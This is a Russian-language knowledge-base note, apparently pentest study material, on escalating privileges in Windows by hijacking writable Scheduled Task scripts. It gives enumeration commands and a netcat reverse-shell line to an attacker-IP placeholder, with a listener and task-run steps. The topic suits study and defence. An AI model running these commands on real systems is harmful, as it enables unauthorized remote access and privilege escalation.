---
title: "Повышение привилегий в Windows машинах  Escalation через запланированные задачи (Scheduled Tasks)"
id: note-43
created: "03.02.2026 10:42"
category: "07_Windows и Active Directory"
tags:
  - иб/windows
  - ad
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `07_Windows и Active Directory` · Дата: `03.02.2026 10:42`

# Повышение привилегий в Windows машинах  Escalation через запланированные задачи (Scheduled Tasks)

Суть уязвимости
Служба Task Scheduler запускает задачи от имени других пользователей. Если можем изменить скрипт задачи → выполняем наш код от имени этого пользователя.
Поиск уязвимых задач
schtasks
schtasks /query /fo LIST
2. Детали по конкретной задаче
schtasks /query /tn ИмяЗадачи /fo list /v
Что ищем:
Task To Run — какой файл запускается
Run As User — от чьего имени выполняется
3. Проверяем права на файл задачи
icacls C:\путь\к\файлу.bat
Нужно: (F) = Full access (полный доступ)

Эксплуатация
1. Подменяем файл задачи
Заменяем содержимое .bat файла на reverse shell
echo c:\tools\nc64.exe -e cmd.exe АТАКЕР_IP 4444 > C:\tasks\файл_задачи.bat

Или с помощью PowerShell
'c:\tools\nc64.exe -e cmd.exe АТАКЕР_IP 4444' > C:\tasks\файл_задачи.bat
2. Запускаем listener на своей машине
nc -lvnp 4444
3. Запускаем задачу вручную
schtasks /run /tn ИмяЗадачи
4. Ждём автоматического запуска
5.  Если нет прав на ручной запуск — ждём, когда задача выполнится по расписанию.

Быстрый чек
1. Ищем задачи
schtasks

2. Проверяем права на файлы задач
for /f "tokens=2 delims=:" %i in ('schtasks /query /fo list ^| findstr "Task To Run"') do @echo %i && icacls %i 2>nul

1. schtasks                                                      → Смотрим все задачи
2. schtasks /query /tn ЗАДАЧА                    → Смотрим детали
3. icacls ФАЙЛ                                               → Проверяем права
4. Подменяем .bat файл                              → Вставляем reverse shell
5. Запускаем listener                                    → nc -lvnp 4444
6. schtasks /run /tn ЗАДАЧА                        → Запускаем задачу
7. Получаем shell                                           → От пользователя задачи



Если есть (F) на файле задачи и она запускается от другого пользователя → можно получить его привилегии!
